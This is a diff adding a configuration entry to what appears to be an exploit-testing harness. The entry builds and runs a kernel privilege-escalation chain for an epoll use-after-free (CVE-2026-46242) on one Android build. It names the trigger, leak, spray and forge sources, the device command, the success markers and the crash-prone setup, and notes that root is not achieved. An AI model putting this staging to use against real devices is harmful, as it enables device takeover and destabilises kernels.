@@ -1,0 +1,103 @@
+# entry.badepoll-esc@6.1 — CVE-2026-46242 escalation: same binary and build as
+# entry.badepoll@6.1, one flag apart. Orphans the epitem and runs the read/write
+# chains; the reclaim miss is the point, so panics are expected and archived.
+
+schema = 1
+kind   = "entry"
+id     = "entry.badepoll-esc@6.1"
+cve    = "CVE-2026-46242"
+kmi    = ["android14-6.1"]
+targets = ["panther-CP2A.260705.006"]   # the only build that states the escalation's facts, below
+
+composed = false
+status   = "escalation + read/write chains, panther-specific; runs end to end from an unprivileged shell but the fatal-on-miss read survives as a cross-cache delivery MISS, so root is not achieved and unlikely. Never kill a parked orphan (list_del BUG on teardown); reset by reboot."
+
+[build]
+form    = "static-exe"
+entry   = "main"
+sources = [
+  "cves/cve-2026-46242-badepoll/oracle46242.c",
+  "cves/cve-2026-46242-badepoll/bp_trigger.c",
+  "cves/cve-2026-46242-badepoll/bp_leak.c",
+  "cves/cve-2026-46242-badepoll/bp_spray.c",
+  "cves/cve-2026-46242-badepoll/bp_forge.c",
+  "cves/lib/spray/notifyspray.c",
+]
+includes = ["cves"]             # resolves TARGET_HEADER
+depends  = ["cves/lib/kaslr/kaslr_tracefs.h", "cves/lib/*/*.h"]   # aar.h pulls the header-only KASLR leak
+defines  = ["BADEPOLL_ESCALATION=1"]
+cflags   = ["-std=gnu17", "@OPT@", "-static", "-pthread", "-Werror", "-iquote", "."]
+opt      = ["-O2", "-g0"]
+ldflags  = []
+output   = "cve-2026-46242-badepoll-esc"
+uses_target_header = true    # structure layouts and symbol offsets
+
+[facts]
+header = "cves/targets/{target}/target.h"
+# The escalation compiles only where the build has measured these three: the
+# event-poll operations table a fabricated file must name, a byte-clean anchor
+# for the fabricated record, and the candidate anchors the read primitive
+# scans. Requiring them here turns "the payload silently has no escalation
+# path" into a named refusal at resolve time.
+requires = ["EVENTPOLL_FOPS", "WPOKE_PRIV_OFF", "AAR_TARGETS",
+            "SLIDE_TRACE_MARK_IP_OFF", "SYSTEM_UNBOUND_WQ_OFF"]
+
+[properties]
+retry_safe  = false
+panic_risk  = { pre_slide = "high", post_slide = "high" }
+# Two unrepairable writes: the bug's 8-byte zero into a kmalloc-256 object (a
+# stranger's on a lost reclaim) and the orphaned epitem held live until reboot.
+destructive = [
+  "eventpoll.refs.first of a foreign kmalloc-256 object (on a lost reclaim)",
+  "an orphaned epitem held live in the shot process (released only by reboot)",
+]
+restores    = []
+provides      = []
+requires_caps = []
+retains       = []
+
+[invoke]
+kind = "device-exec"
+artifact_source = "build"
+dest = "/data/local/tmp/badepoll-entry"
+mode = "755"
+# --panic-debug drives the escalation with the AAR forge; --max-seconds bounds a
+# shot (round cap is the backstop) and unbuffered stdout survives a mid-shot panic.
+command = "cd @DEV_TMP@; @DEV_ENTRY@ --hunt 40000000 --max-seconds 300 --panic-debug > @DEV_LOG@ 2>&1"
+accepts_base = false
+needs_root = false
+
+[markers]
+# PASS = the chain reached its read and the forged bytes were there (aar_finish()==0).
+pass = 'AAR_FINAL win'
+gate_fail = 'BADEPOLL_ORACLE_GATE_FAIL'   # oracle arms disagreed: permanent on this kernel
+restore_pass = 'BADEPOLL_NO_SUCH_RESTORE_PASS'   # sentinels: nothing to restore
+restore_bad  = 'BADEPOLL_NO_SUCH_RESTORE_BAD'
+heartbeat = 'BADEPOLL_HEARTBEAT seq=[0-9]+'
+diag       = '(done: rounds=[0-9]+ .*|escalate: orphan_confirmed=[0-9]+ .*|ESCALATE_LOST_RECLAIM .*|a[0-9]+: WIN detected).*'
+diag_count = 'rounds=[0-9]+'
+
+# Exit status -> outcome (oracle46242.c EXIT_*); markers win over it.
+#   1 ran, no win -> MISS   2/3 bad argv or setup -> REFUSED   4 oracle unsound -> PRECONDITION_FAIL
+[exit_map]
+"1" = "MISS"
+"2" = "REFUSED"
+"3" = "REFUSED"
+"4" = "PRECONDITION_FAIL"
+
+[provides]
+caps  = []
+field = ''
+label = ""
+
+# Reboot per shot: the filp reclaim is a race against every other opener, and a
+# fresh boot has a far less fragmented filp cache. Then record the racing conditions.
+[[setup]]
+reboot = true
+description = "boot to a quiet kernel: the filp reclaim is a race against every other opener on the device"
+
+[[setup]]
+command = "echo badepoll-setup cpus=$(grep -c ^processor /proc/cpuinfo) kernel=$(uname -r) uptime=$(cut -d. -f1 /proc/uptime)s"
+once_per_boot = true
+needs_root = false
+description = "record the racing conditions (cpu count, kernel, uptime) in the shot log"
